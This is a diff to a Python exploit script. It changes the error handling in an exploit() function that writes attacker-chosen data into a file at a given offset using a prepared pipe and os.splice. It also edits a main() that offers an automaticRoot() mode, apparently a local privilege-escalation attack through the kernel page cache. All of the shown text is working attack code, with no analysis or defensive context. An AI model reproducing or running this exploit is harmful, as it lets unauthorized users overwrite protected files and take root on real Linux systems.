@@ -32,26 +32,26 @@ def exploit(fi, offset, data):
         lenF = len(open(fi).read())
     except FileNotFoundError:
         print("Couldn't open file.")
-        return 1
+        sys.exit(1)
     
     if offset % PAGE_SIZE == 0:
         print('Sorry, cannot start writing at a page boundary.')
-        return 1
+        sys.exit(1)
     
     nextPage = (offset | (PAGE_SIZE - 1)) + 1
     endOffset = offset + len(data)
 
     if endOffset > nextPage:
         print("Sorry, cannot write accross a page bondary")
-        return 1
+        sys.exit(1)
     
     if offset > lenF:
         print("Sorry, offset is not inside the file.")
-        return 1
+        sys.exit(1)
     
     if endOffset > lenF:
         print("Sorry, cannot enlarge the file")
-        return 1
+        sys.exit(1)
 
     w = preparePipe()
     os.splice(f, w, offset)
@@ -98,7 +98,7 @@ def main():
         automaticRoot()
     elif args.writeFile:
         f, offset, data = args.writeFile
-        exploitRun = exploit(f, int(offset), data)
+        exploit(f, int(offset), data)
     else:
         parser.print_help()
     
